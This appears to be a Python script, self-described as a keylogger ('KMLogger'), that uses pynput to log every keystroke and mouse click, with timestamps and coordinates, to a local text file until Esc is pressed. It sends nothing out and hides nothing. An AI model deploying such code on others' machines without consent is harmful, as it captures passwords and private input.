from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from datetime import datetime
import os

output_file = os.path.abspath('activity_log.txt')


def on_press(key):
    """
    Listener function for handling key press events. Logs the pressed key along with the datetime of the event to an
     output file, as well as whether the key event was for a 'special' (non-alphanumeric) key.
    :param key: The key event
    """
    try:
        # Get the current datetime
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")

        # Logging pressed key and datetime to the output file
        with open(output_file, 'a') as f:
            f.write('Time: {0}, Key pressed: {1}\n'.format(current_time, key.char))
    except AttributeError:
        # Handling special keys
        with open(output_file, 'a') as f:
            f.write('Time: {0}, Special key pressed: {1}\n'.format(current_time, key))


def on_click(x, y, button, pressed):
    """
    Listener function for handling mouse click events. Logs the (x,y) coordinate location of the mouse click, the mouse
     that was clicked (e.g. left or right-click), and whether the event was a click-press or click-release.
    :param x: The x coordinate of the mouse event in relation to the display
    :param y: The y coordinate of the mouse event in relation to the display
    :param button: The mouse button responsible for the mouse event
    :param pressed: Boolean value representing if the mouse event was for a click-press (0) or click-release (1)
    :return:
    """
    # Get the current datetime
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Logging mouse click and datetime to the output file
    with open(output_file, 'a') as f:
        if pressed:
            f.write('Time: {0}, Mouse clicked at ({1}, {2}) with {3}\n'.format(current_time, x, y, button))
        else:
            f.write('Time: {0}, Mouse released at ({1}, {2}) with {3}\n'.format(current_time, x, y, button))


def on_release(key):
    """
    Key event handler for checking if the key event was for an 'esc' key press. If so, returns False to signal to end
     the program.
    :param key: The key event
    :return: False if key event is for the 'esc' key
    """
    if key == Key.esc:
        # Stop the mouse listener when 'esc' key is pressed
        mouse_listener.stop()

        # Stop the listener and exit the program when 'esc' key is pressed
        return False


print('KMLogger Output file: ', output_file)

# Starting the keylogger and mouse listener
with Listener(on_press=on_press, on_release=on_release) as key_listener, MouseListener(
        on_click=on_click) as mouse_listener:
    key_listener.join()
    mouse_listener.join()
